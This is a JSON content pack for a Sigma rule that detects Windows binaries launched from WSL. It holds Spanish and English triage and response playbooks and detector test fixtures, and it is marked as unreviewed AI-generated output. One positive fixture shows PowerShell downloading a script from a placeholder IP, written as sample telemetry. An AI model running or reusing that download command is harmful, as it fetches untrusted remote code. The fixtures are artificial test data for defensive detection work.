@@ -1,0 +1,119 @@
+{
+  "rule": {
+    "id": "ed825c86-c009-4014-b413-b76003e33d35",
+    "title": "Windows Binary Executed From WSL",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_wsl_windows_binaries_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_wsl_windows_binaries_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1202"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un ejecutable de Windows (Image en una ruta de unidad como C:\\) se inició con un CurrentDirectory bajo \\\\wsl.localhost. Lo más probable es que se haya lanzado desde una shell Linux de WSL mediante interop.",
+      "what_it_detects": "Eventos de creación de procesos donde Image coincide con una ruta de unidad de Windows (regex [a-zA-Z]:\\) y CurrentDirectory contiene \\\\wsl.localhost, la ruta UNC que usa Windows para los sistemas de archivos de las distribuciones WSL.",
+      "why_it_matters": "Iniciar binarios de Windows desde WSL rompe la cadena habitual de procesos padre e hijo y puede ocultar el origen real de la actividad a las herramientas que dependen del linaje de procesos. Es ejecución indirecta de comandos (ATT&CK T1202), usada para ejecución y evasión.",
+      "triage_steps": [
+        "Revise Image y CommandLine. Verifique si el binario (powershell.exe, rundll32.exe, curl.exe, un LOLBin) y sus argumentos tienen sentido para el trabajo del usuario.",
+        "Lea CurrentDirectory para identificar la distribución WSL y la ruta Linux, por ejemplo \\\\wsl.localhost\\Ubuntu\\home\\<usuario>, y anote carpetas inusuales o temporales.",
+        "Revise ParentImage y el árbol de procesos completo. Lo esperable son componentes de WSL; busque también procesos hijos que haya creado el binario de Windows.",
+        "Identifique al usuario y confirme que tiene WSL aprobado y que está instalado en este equipo de forma intencional.",
+        "En el mismo host, busque conexiones de red, escrituras de archivos y otros procesos lanzados desde WSL en una ventana de +/- 15 minutos.",
+        "Si es posible, revise el historial de la shell Linux y los archivos modificados recientemente en esa ruta de la distribución, en busca de scripts que invoquen binarios de Windows.",
+        "Busque alertas previas para este host y este usuario, y el mismo CommandLine en otros endpoints."
+      ],
+      "false_positives": [
+        "Desarrolladores que abren editores o herramientas desde WSL, como notepad.exe, explorer.exe o code, con el directorio de trabajo en su home Linux.",
+        "Scripts de compilación o pruebas en WSL que invocan herramientas de Windows como powershell.exe, git.exe o dotnet.exe mediante interop.",
+        "Scripts de TI o de administración que ejecutan utilidades de Windows desde un entorno WSL."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del activo si la actividad era esperada y compárela con los flujos de trabajo de desarrollo conocidos.",
+        "Si parece maliciosa, aísle el endpoint y detenga el proceso de Windows y la instancia WSL (wsl --terminate <distro>) después de recolectar evidencia.",
+        "Recolecte los archivos de la distribución WSL, el historial de la shell y los payloads descargados. Calcule sus hash y verifíquelos contra inteligencia de amenazas.",
+        "Elimine la persistencia encontrada en Windows o dentro de la distribución, restablezca las credenciales expuestas y restrinja WSL por política si no se necesita."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque lanzar binarios de Windows desde WSL es común entre desarrolladores, pero puede ocultar el linaje de procesos, así que cada caso requiere revisar el contexto antes de escalar."
+    },
+    "en": {
+      "summary": "A Windows executable (Image on a drive path such as C:\\) started with a CurrentDirectory under \\\\wsl.localhost, meaning it was most likely launched from inside a WSL Linux shell through interop.",
+      "what_it_detects": "Process creation events where Image matches a Windows drive path (regex [a-zA-Z]:\\) and CurrentDirectory contains \\\\wsl.localhost, the UNC path Windows uses for WSL distribution file systems.",
+      "why_it_matters": "Starting Windows binaries from WSL breaks the usual parent-child process chain and can hide the real origin of activity from tools that rely on process lineage. This is indirect command execution (ATT&CK T1202), used for execution and stealth.",
+      "triage_steps": [
+        "Review Image and CommandLine. Check whether the binary (powershell.exe, rundll32.exe, curl.exe, a LOLBin) and its arguments make sense for the user's work.",
+        "Read CurrentDirectory to find the WSL distribution and Linux path, for example \\\\wsl.localhost\\Ubuntu\\home\\<user>, and note any unusual or temporary folders.",
+        "Check ParentImage and the full process tree. Expect WSL components, and look for child processes the Windows binary spawned.",
+        "Identify the user and confirm that WSL is approved for them and installed on this host on purpose.",
+        "On the same host, look for network connections, file writes and other WSL-launched processes within +/- 15 minutes.",
+        "Where possible, review the Linux shell history and recently changed files in that distribution path for scripts that call Windows binaries.",
+        "Search for earlier alerts for this host and user, and for the same CommandLine on other endpoints."
+      ],
+      "false_positives": [
+        "Developers opening editors or tools from WSL, such as notepad.exe, explorer.exe or code, with the working directory in their Linux home.",
+        "Build or test scripts in WSL that call Windows tools like powershell.exe, git.exe or dotnet.exe through interop.",
+        "IT or admin scripts that run Windows utilities from a WSL environment."
+      ],
+      "response_steps": [
+        "Confirm with the user or asset owner whether the activity was expected, and compare it with known developer workflows.",
+        "If it looks malicious, isolate the endpoint and stop the Windows process and the WSL instance (wsl --terminate <distro>) after you have collected evidence.",
+        "Collect the WSL distribution files, shell history and any downloaded payloads. Hash them and check them against threat intelligence.",
+        "Remove persistence found in Windows or inside the distribution, reset any exposed credentials, and restrict WSL use by policy if it is not needed."
+      ],
+      "severity_rationale": "Medium fits because launching Windows binaries from WSL is common among developers but can hide process lineage, so each case needs context review rather than immediate escalation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched from a WSL Ubuntu shell to download a script; the working directory is the user's WSL home through the UNC path.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command Invoke-WebRequest -Uri http://203.0.113.10/a.ps1 -OutFile a.ps1",
+          "CurrentDirectory": "\\\\wsl.localhost\\Ubuntu\\home\\jperez\\",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Notepad opened from a WSL project folder.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0187.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\notepad.exe",
+          "CommandLine": "notepad.exe config.yaml",
+          "CurrentDirectory": "\\\\wsl.localhost\\Ubuntu-22.04\\home\\mrojas\\projects\\api\\",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "The same PowerShell binary started normally from the user's Windows profile; CurrentDirectory does not contain \\\\wsl.localhost.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command Get-ChildItem",
+          "CurrentDirectory": "C:\\Users\\jperez\\",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
